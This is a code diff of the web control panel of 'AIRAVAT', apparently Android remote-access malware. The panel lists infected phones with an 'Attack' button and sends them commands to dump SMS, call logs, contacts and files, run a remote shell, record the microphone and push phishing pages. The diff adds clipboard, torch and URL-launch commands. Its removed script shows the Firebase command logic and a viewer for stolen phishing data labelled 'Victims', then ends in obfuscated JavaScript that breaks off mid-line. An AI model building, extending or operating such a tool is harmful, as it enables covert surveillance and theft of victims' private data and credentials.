@@ -3,7 +3,6 @@
 <head>
 <title>AIRAVAT</title>
 <meta charset="UTF-8" />
-<script src="https://kit.fontawesome.com/87d32896ba.js" crossorigin="anonymous"></script>
 <link rel="icon" href="./img/logo.png"  >
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script src="./firebase-app.js"></script>
@@ -21,7 +20,8 @@ projectId: "PROJECT ID",
 storageBucket: "BUCKET URL",
 messagingSenderId: "SENDER ID",
 appId: "APP ID"
-}; 
+};
+ 
 
 //DON'T EDIT BELOW THIS
 
@@ -52,6 +52,7 @@ background:#000;
 width:100%;
 z-index:999999999;
 color:green;
+display:block;
 position:relative;
 }
 .usr{
@@ -532,21 +533,21 @@ text-align:center;
 
 <div class="dfle"  style="" >
 <div class="icon" onclick="dumpsms()">Dump SMS</div>
-<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Call Logs</div>
+<div class="icon" onclick="calllogs()" style="background:url('./img/dump_call_logs.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >CallLogs</div>
 <div class="icon" onclick="filesmanager()" style="background:url('./img/ic3.png');background-size:50px 50px;background-repeat:no-repeat;" >My Files</div>
-<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Apps List</div>
+<div class="icon" onclick="getpackages()" style="background:url('./img/list_installed_apps.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >AppsList</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Sys Info</div>
+<div class="icon" onclick="deviceinfo()" style="background:url('./img/dump_device_info.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >SysInfo</div>
 <div class="icon" onclick="toastt()" style="background:url('./img/toast.png');background-size:50px 50px;background-repeat:no-repeat;" >Toast</div>
 <div class="icon" onclick="dumpcontact()" style="background:url('./img/dump_contacts.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;" >Contacts</div>
-<div class="icon" onclick="funcmd()" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >Play Music</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/itune.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1.07);" >PlayMusic</div>
 </div>
 <div class="dfle"  style="" >
-<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >Send SMS</div>
+<div class="icon" onclick="sendmsg()" style="background:url('./img/send_message.png');background-size:52px 52px;baxkground-position:0 0;background-repeat:no-repeat;transform:scale(1);" >SendSMS</div>
 <div class="icon" onclick="startshell()" style="background:url('./img/shell_command.png');background-size:50px 50px;background-repeat:no-repeat;" >Shell</div>
-<div class="icon" onclick="funcmd()" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
-<div class="icon" onclick="funcmd()" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img3.png');background-size:54px 54px;background-repeat:no-repeat;background-position:-2px -2px;">Vibrator</div>
+<div class="icon" onclick="funcmd('fmc1')" style="background:url('./img/img5.png');background-size:50px 50px;background-repeat:no-repeat;">TTS</div>
 
 </div>
 <div class="dfle"  style="" >
@@ -558,11 +559,16 @@ text-align:center;
 <div class="dfle"  style="" >
 <div class="icon" onclick="showphpag()" style="background:url('./img/scams.png');background-size:50px 50px;background-repeat:no-repeat;">Scams</div>
 <div class="icon" onclick="micrec()" style="background:url('./img/microphone_rec.png');background-size:50px 50px;background-repeat:no-repeat;">Recordings</div>
+<div class="icon" onclick="showclip()" style="background:url('./img/clip.png');background-size:50px 50px;background-repeat:no-repeat;">ClipBoard</div>
+<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/img4.png');background-size:50px 50px;background-repeat:no-repeat;">Torch</div>
+</div>
+<div class="dfle"  style="" >
+<div class="icon" onclick="funcmd('fmc2')" style="background:url('./img/web.png');background-size:50px 50px;background-repeat:no-repeat;">LaunchURL</div>
 </div>
 </div>
 
 
-<div id="cmdcernter" >
+<div id="cmdcernter" style="display:none;" >
 <input type="text" id="cmdref" placeholder="cmdref" value="/comds/comdsdc38kw6i"   ><br>
 <input type="text" id="cmd"  placeholder="cmd type"  ><br>
 <input type="text" id="cmdvar"  placeholder="cmm"  ><br>
@@ -752,6 +758,7 @@ color:white;
 
 <div id="pvtt" >
 <h3 style="color:red" >FUN COMMANDS</h3><br><br>
+<div id="fmc1" >
 <div id="plmc" >
 <h4>Play Music </h4><br>
 <input type="text" id="musiccmd"  placeholder="Enter Direct .mp3 link"  >
@@ -768,6 +775,21 @@ color:white;
 <h4>Text To Speech </h4><br>
 <input type="text" id="ttscmd"  placeholder="Enter Your Text Message"  >
 <br><button onclick="ttsf()">Execute</button>
+<br>
+</div>
+</div>
+<div id="fmc2" >
+<div id="tonofff" >
+<h4>Turn On/Off Torch</h4><br>
+<button onclick="tont()">Turn On</button>
+<button style="margin-left:10px;"  onclick="tofft()">Turn Off</button>
+<br><br><hr><br>
+</div>
+<div id="oppweb" >
+<h4>Open URL</h4><br>
+<input type="text" id="opwebcmd"  placeholder="Enter Your URL including http://"  >
+<br><button onclick="opwebl()">Execute</button>
+</div>
 </div>
 </div>
 
@@ -1107,805 +1129,7 @@ display:none;
 }
 </style>
 </div>
-<script type="text/javascript">
-
-$("#preloaderr").fadeOut();
-var respov=$("#cmdref").val();
-var var32="";
-var unqid="";
-var manager="";
-var bckstp=0;
-var database=firebase.database();
-var lastkeynot="";
-var lastkeykey="";
-var lastkeyphish="";
-var lastkeyvoice="";
-var wallpaperno="";
-var uo2=document.getElementById("users");
-
-function opnav(o){
-if($("#navbar").css("display") == "none"){
-
-o.style.color="red";
-o.innerHTML="&#10005;";
-$("#navbar").css("display","block");
-}
-else{
-o.style.color="white";
-o.innerHTML="&#8801;";
-$("#navbar").css("display","none");
-}
-}
-
-function hidekarbsdk(){
-$("#micrec").css("display","none");
-$("#wallpaperdiv").css("display","none");
-$("#senddm").css("display","none");
-$("#pvtt").css("display","none");
-$("#toastdiv").css("display","none");
-$("#notikey").css("display","none");
-$("#viewers").css("display","none");
-$("#fprev").css("display","none");
-$("#resp").css("display","none");
-$("#shellcmd").css("display","none");
-$("#showphishj").css("display","none");
-//$("#").css("display","none");
-
-
-}
-
-
-
-
-
-function userss(){
-var database = firebase.database();
-var ref = database.ref("/online/onlinetheoneandonly");
-ref.on("value",(snapshot) =>{
-if (snapshot.exists()) {
-var scores=snapshot.val();
-var keys=Object.keys(scores);
-uo2.innerHTML="<br>";
-for(var i=0;i<keys.length;i++){
-var k=keys[i];
-var aversion=scores[k].device.android;
-var battery=scores[k].device.battery;
-var model=scores[k].device.phone;
-var ip=scores[k].device.rooted;
-var uid=scores[k].device.id;
-uo2.innerHTML+='<br><div class="usr" >'+model+' <span style="float:right" >'+aversion+'</span><br><br>Rooted: '+ip+' <span style="float:right" >Battery: '+battery+' </span><br><br><center><button onclick="setdev('+"'"+uid+"'"+')">Attack</button></center></div> '; 
-}
-}
-else{
-uo2.innerHTML="No online Devices";
-}
-});
-}
-userss();
-
-
-
-
-
-
-function setdev(o){
-respov="/comds/comds"+o;
-unqid=o;
-$("#cmdref").val("/comds/comds"+o);
-showdat(o);
-$("#users").css("display","none");
-$("#backkk").css("display","block");
-$("#phones").css("display","block");
-}
-
-
-
-
-function setdatcmd(o,p,q,r){
-var result= '';
-var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-var charactersLength = characters.length;
-for ( var i = 0; i < 8; i++ ) {
-result += characters.charAt(Math.floor(Math.random() * charactersLength));
-}
-var store={
-cmdn :o,
-cmdv: p,
-cmdvar : q,
-rndm : result
-};
-$("#phones").css("display","none");
-//hidekarbsdk();
-$("#preloaderr").fadeIn();
-var con =  database.ref(r).child("comdss").set(store);
-}
-
-
-function cmd(){
-var database=firebase.database();
-var us=document.getElementById("cmdref").value;
-var ref=database.ref(us);
-var hio=document.getElementById("cmd").value;
-var hio2=document.getElementById("cmdvar").value;
-var hio3=document.getElementById("cmdvarm").value;
-setdatcmd(hio,hio2,hio3,us);
-//ref.child("Victor").setValue("setting");//.push(store);
-//con.onDisconnect().remove();
-
-}
-function showdat(o){
-var database = firebase.database();
-var ref = database.ref("respos/respo"+o);
-ref.on("child_changed",(snapshot) => {
-if (snapshot.exists()) {
-var dat=snapshot.val();
-var respo=dat.respo+"";
-var v1=dat.v1+"";
-var v2=dat.v2+"";
-var v3=dat.v3+"";
-var32=dat.var2+"";
-$("#preloaderr").fadeOut();
-if(manager=="filesmanager"){
-filesfol(respo,v1,v2,v3,var32);
-}
-else if(manager=="fileview"){
-fileev(v1);
-}
-else if(manager=="shellview"){
-shellviewer(v1);
-}
-else if(manager=="deviceinfo"){
-showinfodev(v1);
-}
-else if(manager=="dialogview"){
-showdialog(v1);
-}
-else{
-}
-
-
-/*
-
-*/
-
-} else {
-console.log("No data available");
-}
-});
-}
-function backk(o){
-if($("#users").css("display") == "none" && $("#phones").css("display") == "none"){
-hidekarbsdk();
-$("#users").css("display","none");
-$("#phones").css("display","block");
-}
-else if($("#users").css("display") == "none" && $("#phones").css("display") != "none"){
-hidekarbsdk();
-$("#backkk").css("display","none");
-$("#users").css("display","block");
-$("#phones").css("display","none");
-}
-else{
-
-}
-}
-function showphish(){
-manager="notikey";
-if(manager=="notikey"){
-var psdus=document.getElementById("notikey");
-hidekarbsdk();
-$("#preloaderr").fadeIn();
-$("#phones").css("display","none");
-var database = firebase.database();
-var ref = database.ref("pdata/pdatahiddenser");//+localStorage.getItem("airavatpass"));
-ref.limitToFirst(10).on("value",gotData);
-function gotData(data){
-$("#preloaderr").fadeOut();
-psdus.style.display="block";
-psdus.innerHTML='';
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var data2=scores[k].data;
-
-psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
-}
-if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeyphish=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";
-
-}
-lastkeyphish=keys[keys.length-1]+"";
-
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Victims  Found<h4></div>';
-}
-
-}
-}
-}
-
-function showphishu(o,p){
-manager="notikey";
-if(manager=="notikey"){
-o.innerHTML=".....";
-o.disabled=true;
-var psdus=document.getElementById("notikey");
-var database = firebase.database();
-var ref = database.ref("pdata/pdatahiddenser");
-ref.orderByKey().startAt(p).limitToFirst(10).on("value",gotData);
-function gotData(data){
-if (data.exists()) {
-var scores=data.val();
-var keys=Object.keys(scores);
-var i=0;
-psdus.style.display="block";
-o.style.display="none";
-for(i=(keys.length-1);i > -1 ;i--){
-var k=keys[i];
-var data2=scores[k].data;
-psdus.innerHTML+='<div class="keylogg" >'+data2+"</div>";
-}
-if(lastkeyphish != (keys[keys.length-1]+"") && parseInt(keys.length) >= 10 ){
-lastkeyphish=keys[keys.length-1]+"";
-psdus.innerHTML+="<br><center><button class='btn' "+'onclick="showphishu(this,'+"'"+lastkeyphish+"'"+')"'+">Load More</button></center><br>";
-}
-lastkeyphish=keys[keys.length-1]+"";
-}
-else{
-psdus.innerHTML='<div class="keylogg" ><h4>No Victims Found<h4></div>';
-}
-}
-}
-}
-
-
-function changewallpaper(){
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#wallpaperdiv").css("display","block");
-}
-
-
-
-function setwalls(){
-alert(wallpaperno)
-setdatcmd("changewall",wallpaperno,"",respov);
-}
-
-
-
-function selectimg(o,p){
-for(var u=0;u<3;u++){
-$(".wallimg").children().eq(u).css("border","none")
-}
-$(o).css("border","2px solid red");
-wallpaperno=p+"";
-}
-function setdatcmd2(o,p,q,s,r){
-var result= '';
-var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-var charactersLength = characters.length;
-for ( var i = 0; i < 8; i++ ) {
-result += characters.charAt(Math.floor(Math.random() * charactersLength));
-}
-var store={
-cmdn :o,
-cmdv: p,
-cmdvar : q,
-cmdvar2 : s, 
-rndm : result
-};
-$("#phones").css("display","none");
-//hidekarbsdk();
-$("#preloaderr").fadeIn();
-var con =  database.ref(r).child("comdss").set(store);
-}
-
-function iojh(){
-var yi=['dropbox3.png','facebook2.png','facebook5.png','free_fire3.png','github1.png','instagram1.png','linkedin1.png','messenger1.png','microsoft1.png','netflix1.png','paypal2.png','protonmail1.png','pubg2.png','snapchat1.png','tumblir1.png','twitter1.png','wordpress1.png','yahoo1.png'];
-document.getElementById("hion").src="./imgg/"+yi[parseInt($("#lshpih").val())];
-}
-function execphish(){
-setdatcmd2("phpage",$("#phpage").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
-}
-function execphish2(){
-setdatcmd2("cust",$("#shpih").val(),$("#nshpih").val(),$("#lshpih").val(),"comds/comds"+unqid+"phi");
-}
-function recordvoice(){
-setdatcmd("micrec",(parseInt($("#recval").val())*1000),"","comds/comds"+unqid+"phi");
-}
-function micrec(){
-voicess();
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#micrec").css("display","block");
-}
-function sendsms(){
-if((!isNaN($("#smsnumber").val() )) && $("#smscontent").val() != "" ){
-setdatcmd("sendsms",$("#smsnumber").val(),$("#smscontent").val(),respov);
-}else{
-alert("Please Enter Valid Data");
-}
-}
-$(".dgh").css("display","none");
-function sendmsg(){
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#senddm").css("display","block");
-}
-function ttsf(){
-if($("#ttscmd").val() != ""){
-setdatcmd("ttsdev",$("#ttscmd").val(),"",respov);
-}
-else{
-alert("Please Enter Valid Text");
-}
-}
-function vibra(){
-if(!isNaN($("#vibratecmd").val())){
-setdatcmd("vibratedev",($("#vibratecmd").val() * 1000),"",respov);
-}
-else{
-alert("Please Enter Valid Time");
-}
-}
-function playmus(){
-if($("#musiccmd").val().indexOf(".mp3") > 0){
-setdatcmd("playsmusic",$("#musiccmd").val(),"",respov);
-}
-else{
-alert("Please Enter Valid URL");
-}
-}
-function showphpag(){
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#showphishj").css("display","block");
-
-}
-function funcmd(){
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#pvtt").css("display","block");
-}
-function showdialog(o){
-$("#diamain").css("display","flex");
-$("#diatext").html(o);
-}
-function toastt(){
-hidekarbsdk();
-manager="dialogview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#toastdiv").css("display","block");
-}
-function toastexc(){
-setdatcmd("toasttext",$("#toastcmd").val(),"",respov);
-}
-function deviceinfo(){
-hidekarbsdk();
-manager="deviceinfo";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-setdatcmd("deviceinfo","","",respov);
-}
-function showinfodev(o){
-hidekarbsdk();
-$("#notikey").css("display","block");
-$("#notikey").html(o);
-}
-function startshell(){
-hidekarbsdk();
-manager="shellview";
-$("#phones").css("display","none");
-$("#users").css("display","none");
-$("#shellcmd").css("display","block");
-}
-function shellcm(o){
-if (event.keyCode === 13) {
-setdatcmd("shellcmd",o.value,"",respov);
-}
-}
-function shellviewer(o){
-$("#shellcmd").css("display","block");
-$("#shelldata").html("AIRAVAT Shell<br><br>"+o.replaceAll("\n","<br>"))
-
-}
-function convertTimestamp(timestamp) {
-var d = new Date(timestamp),	// Convert the passed timestamp to milliseconds
-yyyy = d.getFullYear(),
-mm = ('0' + (d.getMonth() + 1)).slice(-2),	// Months are zero based. Add leading 0.
-dd = ('0' + d.getDate()).slice(-2),			// Add leading 0.
-hh = d.getHours(),
-h = hh,
-min = ('0' + d.getMinutes()).slice(-2),		// Add leading 0.
-ampm = 'AM',
-time;
-if (hh > 12) {
-h = hh - 12;
-ampm = 'PM';
-} else if (hh === 12) {
-h = 12;
-ampm = 'PM';
-} else if (hh == 0) {
-h = 12;
-}
-time = yyyy + '-' + mm + '-' + dd + ', ' + h + ':' + min + ' ' + ampm;
-return time;
-}
-
-(function(_0x98dec8,_0x2a2bb9){function _0x444d43(_0x3211d0,_0x221681,_0x1541ef,_0x59b600){return _0x8d89(_0x1541ef- -0x50,_0x3211d0);}function _0x298dd6(_0x53ce0d,_0x2500e2,_0x1dd191,_0x25ae02){return _0x8d89(_0x25ae02-0x98,_0x53ce0d);}var _0x1973f6=_0x98dec8();while(!![]){try{var _0x41c1a2=-parseInt(_0x444d43(0xf0,0xf3,0x116,0x118))/(0x1aaf+-0x1884+-0x22a)*(-parseInt(_0x444d43(0x118,0x113,0x11a,0x131))/(-0x18a5+0xf7c+0x92b))+-parseInt(_0x444d43(0x162,0x12c,0x14f,0x12c))/(0x1a21+-0x18e5+-0x139)*(parseInt(_0x298dd6(0x20f,0x243,0x212,0x231))/(-0x223c+0xa19*-0x2+0x3672))+-parseInt(_0x444d43(0x174,0x17a,0x153,0x160))/(0x1356+-0x13*-0x1df+-0x36de)+-parseInt(_0x444d43(0x114,0x15f,0x143,0x12a))/(0x1691+0xb2*-0x1+-0x15d9)+parseInt(_0x298dd6(0x22d,0x207,0x230,0x234))/(0x15ce+-0x6*-0x572+-0x3673)+-parseInt(_0x298dd6(0x213,0x203,0x234,0x20d))/(0xaf1+0x217f+-0x2c68)+-parseInt(_0x444d43(0x11e,0x149,0x121,0x104))/(-0x3*-0xaca+-0x1*-0xa57+-0x2*0x1556)*(-parseInt(_0x298dd6(0x208,0x1f8,0x1ef,0x204))/(0x263c+0xbdb+-0x1*0x320d));if(_0x41c1a2===_0x2a2bb9)break;else _0x1973f6['push'](_0x1973f6['shift']());}catch(_0x478707){_0x1973f6['push'](_0x1973f6['shift']());}}}(_0x54fe,0x1*-0x2a577+-0x31425+0x1775*0x6f));var _0xc60a25=(function(){var _0x11abb0={};function _0x31a7c3(_0x126ec1,_0x2d5c57,_0x56ab48,_0x48df11){return _0x8d89(_0x56ab48- -0x39b,_0x2d5c57);}_0x11abb0[_0x31a7c3(-0x1df,-0x1d5,-0x1f7,-0x1e0)]=function(_0x21ee88,_0x869650){return _0x21ee88+_0x869650;};function _0x348070(_0x1fde47,_0x379ce1,_0x131459,_0x213b2a){return _0x8d89(_0x1fde47-0x34a,_0x379ce1);}_0x11abb0[_0x348070(0x49e,0x4ce,0x49b,0x4c7)]=_0x31a7c3(-0x22c,-0x20d,-0x23a,-0x225),_0x11abb0['jiaiI']=_0x348070(0x4eb,0x505,0x4d6,0x4ee);var _0x3428d6=_0x11abb0,_0x1dc8c8=!![];return function(_0x468bf4,_0x555324){function _0x2ebe29(_0x190969,_0x2f6317,_0x5af77c,_0x301322){return _0x348070(_0x2f6317- -0x2a7,_0x190969,_0x5af77c-0x165,_0x301322-0x128);}var _0x2e6c90={'KxBcR':function(_0x4cceda,_0x3c3103){function _0x574b02(_0x4330f7,_0x1fde7b,_0x42845e,_0x45d412){return _0x8d89(_0x1fde7b-0x354,_0x42845e);}return _0x3428d6[_0x574b02(0x50f,0x4f8,0x4e7,0x524)](_0x4cceda,_0x3c3103);},'KWOYi':function(_0x7448b7,_0x186080){function _0xb67ddd(_0x33d1d2,_0xf0073f,_0x1ca424,_0x260b3e){return _0x8d89(_0x260b3e-0x38a,_0x33d1d2);}return _0x3428d6[_0xb67ddd(0x50d,0x53f,0x52f,0x52e)](_0x7448b7,_0x186080);},'RfqTx':_0x3d32d8(0x295,0x283,0x2ab,0x29b)+'nction()\x20','NLfaA':_0x2ebe29(0x21e,0x223,0x23c,0x1f8)+_0x2ebe29(0x215,0x1fa,0x1e6,0x1fc)+_0x3d32d8(0x26e,0x27d,0x291,0x27e)+'\x20)','bbklE':function(_0x221d7b){return _0x221d7b();},'QAUvS':_0x3428d6[_0x2ebe29(0x215,0x1f7,0x1e2,0x21d)]};function _0x3d32d8(_0x923ac6,_0x2e9451,_0x53a70b,_0x24ca9c){return _0x348070(_0x2e9451- -0x218,_0x53a70b,_0x53a70b-0xab,_0x24ca9c-0x65);}if(_0x3428d6[_0x2ebe29(0x1f2,0x20b,0x23b,0x1db)]===_0x3428d6['jiaiI']){var _0x506dd0=_0x1dc8c8?function(){function _0xf52324(_0x1418ed,_0x1812db,_0x13604e,_0x5bf586){return _0x2ebe29(_0x13604e,_0x1812db-0x9f,_0x13604e-0x26,_0x5bf586-0xa3);}var _0x256684={'ctOjr':function(_0x4cf3c1,_0x54392d){function _0x3c71b9(_0x553445,_0x3e68eb,_0x8efe79,_0x2180d5){return _0x8d89(_0x553445- -0x292,_0x2180d5);}return _0x2e6c90[_0x3c71b9(-0x12b,-0x107,-0x109,-0x115)](_0x4cf3c1,_0x54392d);},'pofIF':function(_0x3a5f93,_0x4744d9){function _0x1ccca1(_0xa0a389,_0x4f5d14,_0x109030,_0x2d7589){return _0x8d89(_0x2d7589-0x1fd,_0xa0a389);}return _0x2e6c90[_0x1ccca1(0x394,0x395,0x35d,0x38d)](_0x3a5f93,_0x4744d9);},'NaMuX':_0x2e6c90['RfqTx'],'iWvwU':_0x2e6c90[_0xf52324(0x29e,0x298,0x29b,0x26f)],'iPYOx':function(_0x252d20){function _0x42366b(_0x2bb662,_0x2cf7c1,_0x553467,_0x55bf0d){return _0xf52324(_0x2bb662-0x131,_0x2cf7c1- -0x17d,_0x553467,_0x55bf0d-0x16a);}return _0x2e6c90[_0x42366b(0x171,0x16a,0x18a,0x13b)](_0x252d20);}};function _0x230026(_0x458b03,_0x24c333,_0x5afbaa,_0x33231b){return _0x2ebe29(_0x458b03,_0x5afbaa- -0x2f0,_0x5afbaa-0xa5,_0x33231b-0xc6);}if(_0x555324){if(_0x2e6c90[_0xf52324(0x289,0x2a2,0x2ab,0x278)]!==_0xf52324(0x2cf,0x2a3,0x280,0x2b1)){var _0xf3faf6=_0x2a37bd(_0x256684[_0xf52324(0x2c0,0x292,0x263,0x2b4)](_0x256684['pofIF'](_0x256684['NaMuX'],_0x256684[_0xf52324(0x2bc,0x2c6,0x2f3,0x2ac)]),');'));_0x1a5692=_0x256684[_0xf52324(0x2c3,0x2e0,0x2c8,0x2e3)](_0xf3faf6);}else{var _0x26e964=_0x555324[_0x230026(-0xee,-0xfa,-0xee,-0xfa)](_0x468bf4,arguments);return _0x555324=null,_0x26e964;}}}:function(){};return _0x1dc8c8=![],_0x506dd0;}else _0x491654=_0x11873f;};}());function _0x3e3215(_0x1b33fa,_0x26c5d1,_0x244b13,_0x58259e){return _0x8d89(_0x244b13-0x1b5,_0x26c5d1);}function _0x54fe(){var _0x52b172=['uufvDLm','vvzJEeu','C3r5Bgu','BgHhvhy','DgfIBgu','zM9UDfnPEMu','mJz2yxHZrwG','s3Hcy1i','AMLHAuK','y3jLyxrLrwXLBq','mte2nZHcsvLutKG','BeDKtLi','mJaYnJbxqw9UB1m','Dg9WAgvHza','ANHMvNq','ywjZB2X1Dgu','Dgv4DefSAwDU','mtyYmhPwr0zkrG','mNWXFdr8mhWZFa','s1rmDNC','ueL4ExO','nti4ndb5q1P3sei','D2fYBG','BwfpDem','Aw5Uzxjive1m','zxHJzxb0Aw9U','qungCNe','C2vHCMnO','zxngsuS','DhjHy2u','Aw5eruu','z2v0rwXLBwvUDa','E30Uy29UC3rYDq','BwLOB2q','x19WCM90B19F','CfD6B2C','AvD2D1u','mhW0Fdv8mxWYFa','sKjiuu8','r1HTzuC','y29UC29Szq','CuPdu0u','rg5wvLK','Aw5MBW','CuPlBwK','kcGOlISPkYKRkq','CK9Pthq','mNWWFdr8mxWZ','s1DpwwK','BMn0Aw9UkcKG','C3bSAxq','mtiYodiWnNP0C1zdqq','ChjVDg90ExbL','q0Dzs1u','Bg9N','zgL2','wxHMB3y','oen1BwjUBq','EwLQqwq','q3DvEvO','mZGWnZm3mgHlDxneBa','DgvLAYbdAgf1yG','Avbzt3G','mZG0mJmXrwPZEwHX','mtaWjq','zvbjEe4','ueXNvfO','mtuWnZKYnuPJvhfSBG','t3HYD3K','yMjRBeu','mZbWEa','AhrTsK0','Ae9Uyxq','nhWYFdb8m3WX','zK5YAxy','CM4GDgHPCYiPka','D2LKDgG','yMLUza','y29UC3rYDwn0BW','y2vUDgvY','y3rpANi','CMv0DxjUicHMDq','BgvUz3rO','vvj0A3q','yxL6rhi','ru1VtNC','tKXMyue','y3rVCIGICMv0Dq','v0T6uLi','mtvWEa','Cvn0yLa','Dg9tDhjPBMC','zxjYB3i','Cg9ZAxrPB24','zw50','yxbWBhK'];_0x54fe=function(){return _0x52b172;};return _0x54fe();}var _0x291f81=_0xc60a25(this,function(){var _0x397b5d={};_0x397b5d[_0x3dc89d(0x197,0x1ae,0x1a5,0x17d)]=_0x211f70(-0x154,-0x142,-0x141,-0x13c)+'+$';function _0x211f70(_0x408322,_0x49baf8,_0x27bbb5,_0x9c14b5){return _0x8d89(_0x49baf8- -0x2cf,_0x27bbb5);}var _0x46e1ce=_0x397b5d;function _0x3dc89d(_0x3982f9,_0x3c9c39,_0x1cb730,_0x5d7725){return _0x8d89(_0x1cb730-0x5e,_0x3982f9);}return _0x291f81[_0x211f70(-0x14e,-0x174,-0x160,-0x147)]()[_0x3dc89d(0x1fb,0x1f8,0x1d9,0x1c0)](_0x46e1ce[_0x211f70(-0x176,-0x188,-0x185,-0x1ab)])['toString']()['constructo'+'r'](_0x291f81)[_0x3dc89d(0x1fb,0x1b3,0x1d9,0x1ac)](_0x46e1ce[_0x3dc89d(0x19c,0x17d,0x1a5,0x19c)]);});_0x291f81();var _0xea0927=(function(){var _0x196848={'dzsxj':_0x38e730(0x22a,0x263,0x251,0x280),'mihod':function(_0x1cf742,_0xa47ec){return _0x1cf742(_0xa47ec);},'yijAd':function(_0x38ebc9,_0x29f8bb){return _0x38ebc9+_0x29f8bb;},'EyUeD':'return\x20(fu'+_0x38e730(0x25a,0x25a,0x253,0x23c),'GXmeG':function(_0x5c19ed){return _0x5c19ed();},'inDEE':_0x171ece(0x3ed,0x40b,0x3f9,0x3ea),'Yxfov':_0x38e730(0x23d,0x253,0x24d,0x26b),'qStbP':_0x171ece(0x397,0x38b,0x3c0,0x3b0),'TVyrp':_0x38e730(0x226,0x245,0x23b,0x255),'URtkt':_0x38e730(0x1ff,0x22c,0x226,0x24d),'JBHQO':_0x38e730(0x204,0x22a,0x234,0x214)+'5','bBDDJ':function(_0x5bf782,_0x2d1c47){return _0x5bf782===_0x2d1c47;}},_0x20b6c8=!![];function _0x38e730(_0x3528a2,_0x3bd2e9,_0x2cfb1b,_0x472997){return _0x8d89(_0x2cfb1b-0xc2,_0x3bd2e9);}function _0x171ece(_0x4f5df9,_0x2eb9da,_0x26d92d,_0x4cf50c){return _0x8d89(_0x4cf50c-0x254,_0x2eb9da);}return function(_0x3a2f97,_0x58dc46){var _0x491353={'MCLKJ':_0x196848['dzsxj'],'ACFrq':function(_0x12490b,_0x11b99a){function _0x213949(_0x1e6ad7,_0x3f170c,_0x225de1,_0x1150bb){return _0x8d89(_0x3f170c- -0x6f,_0x1150bb);}return _0x196848[_0x213949(0x12c,0x112,0x116,0x10f)](_0x12490b,_0x11b99a);},'maOtC':function(_0x44272f,_0x1ab37c){function _0x33f2e0(_0x54c9b2,_0xb2f427,_0x57bd7f,_0x472369){return _0x8d89(_0x57bd7f- -0x110,_0xb2f427);}return _0x196848[_0x33f2e0(0xb4,0x7b,0x8a,0xb5)](_0x44272f,_0x1ab37c);},'esFIK':function(_0x46f958,_0xab74cf){return _0x46f958+_0xab74cf;},'CGYKU':_0x196848['EyUeD'],'dGwYN':function(_0x2af077){function _0x1ef120(_0x260608,_0x38c298,_0x239483,_0xd82ed){return _0x8d89(_0x260608-0x196,_0xd82ed);}return _0x196848[_0x1ef120(0x31d,0x34c,0x31c,0x311)](_0x2af077);},'BkqPy':_0x196848[_0x4d7df0(0x30d,0x2f7,0x319,0x301)],'qJCSE':_0x196848[_0x4d7df0(0x32b,0x311,0x326,0x32b)],'KTLvw':_0x196848[_0x48e627(0x5d,0x53,0x80,0x8d)],'WKzRR':_0x196848['TVyrp'],'IuCVF':_0x196848[_0x48e627(0x9a,0x55,0x79,0x66)],'KBqIq':function(_0x1afc28,_0x2ca01d){return _0x1afc28<_0x2ca01d;},'PLgTZ':_0x196848[_0x4d7df0(0x328,0x2ff,0x2ed,0x314)],'qJKmi':function(_0x103545,_0x45e29a){return _0x196848['bBDDJ'](_0x103545,_0x45e29a);},'EMoNw':'LRLzi'},_0x5096f6=_0x20b6c8?function(){function _0x5f5156(_0x40f71b,_0x189f6,_0x254f19,_0xb92309){return _0x48e627(_0x40f71b-0x93,_0xb92309,_0x254f19- -0x30c,_0xb92309-0x13);}function _0x28a0d5(_0x1cc056,_0x315c2f,_0x4a5538,_0x4bd6fc){return 